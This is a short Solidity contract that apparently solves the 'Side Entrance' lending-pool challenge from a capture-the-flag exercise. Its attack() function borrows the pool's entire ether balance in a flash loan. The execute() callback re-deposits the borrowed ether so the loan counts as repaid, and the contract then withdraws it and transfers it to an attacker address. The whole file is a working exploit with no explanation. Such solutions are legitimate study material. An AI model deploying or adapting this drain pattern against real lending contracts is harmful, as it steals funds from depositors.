// SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {
    SideEntranceLenderPool  pool;
    uint256 bal;


    constructor(address payable _pool) payable {
       pool=SideEntranceLenderPool(_pool);
    }

    function attack(address payable attacker) public{
        bal=address(pool).balance;
        pool.flashLoan(bal);
        pool.withdraw();
        attacker.transfer(bal);
       

    }

    function execute() external payable  {
        pool.deposit{value:bal}();
    }
   
    
}